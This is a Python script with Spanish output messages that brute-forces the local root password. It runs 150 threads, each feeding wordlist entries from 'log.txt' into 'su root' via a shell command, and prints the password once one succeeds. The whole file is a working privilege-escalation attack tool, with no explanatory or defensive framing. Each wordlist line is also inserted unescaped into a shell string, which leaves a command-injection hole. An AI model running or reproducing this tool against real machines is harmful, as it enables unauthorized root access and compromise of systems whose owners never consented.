import subprocess
import concurrent.futures

def brute(line,user):

		result = subprocess.run(["echo '{}' | su {}".format(line,user)], shell=True, capture_output=True, text=True)

		print('[-]Espere comprobando claves...{}'.format(line)+" "*10,end='\r',flush=True)

		if(result.returncode==0):
			return line
		else:
			return None

def main():

	dic_pass = 'log.txt'
	user ='root'
	pass_found = None

	with open(dic_pass,'r')as password:
		with concurrent.futures.ThreadPoolExecutor(max_workers=150) as executor:
			futures = []

			for line in password:
				line =line.strip()
				future= executor.submit(brute,line,user)
				futures.append(future)

			for future in concurrent.futures.as_completed(futures):
				resultado=future.result()
				if resultado is not None:
					pass_found = resultado
					break

	if pass_found:
		print("\n[+] PASSWORD ENCONTRADA: {}\n".format(pass_found))
	else:
		print("\n[-] La contraseña no fue encontrada.\n")


if __name__ == '__main__':
	main()
